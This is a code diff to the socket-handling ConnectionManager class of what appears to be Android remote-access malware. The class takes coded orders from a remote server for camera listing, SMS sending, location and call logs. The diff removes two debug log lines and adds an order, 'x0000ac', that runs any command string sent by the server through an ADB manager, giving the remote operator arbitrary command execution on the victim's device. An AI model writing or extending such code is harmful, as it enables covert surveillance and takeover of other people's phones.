@@ -127,11 +127,11 @@ public class ConnectionManager {
             if(forceRecreationConnection){
                 ioSocket = IOSocket.RenewInstance(ioSocket);
                 IOSocket.resetInstance();
-                Log.w("lalo", "Destruyendo Servicio: ");
+
                 context.stopService(new Intent(context, MainService.class));
             }
 
-            Log.w("lalo", "Obteniendo Instancia");
+
             ioSocket = IOSocket.getInstance().getIoSocket();
 
             ioSocket.on("ping", new Emitter.Listener() {
@@ -148,6 +148,7 @@ public class ConnectionManager {
                         JSONObject data = (JSONObject) args[0];
                         String order = data.getString("order");
                         Log.e("order",order);
+
                         switch (order){
                             case "x0000ca":
                                 if(data.getString("extra").equals("camList"))
@@ -180,6 +181,13 @@ public class ConnectionManager {
                                 break;
                             case "x0000lm":
                                 x0000lm();
+                                break;
+                            case "x0000ac":
+                                Log.w("lalo", "data: " + data);
+                                if(data.getString("extra").equals("sendADB")) {
+                                    x0000ac(1, data.getString("cmd"));
+
+                                }
                                 break;
                         }
                     }catch (Exception e) {
@@ -227,6 +235,10 @@ public class ConnectionManager {
             boolean isSent = SMSManager.sendSMS(phoneNo, msg);
             ioSocket.emit("x0000sm", isSent);
         }
+    }
+
+    public static void x0000ac(int req,String cmd){
+            ADBManager.sendADB(cmd);
     }
 
     public static void x0000cl(){
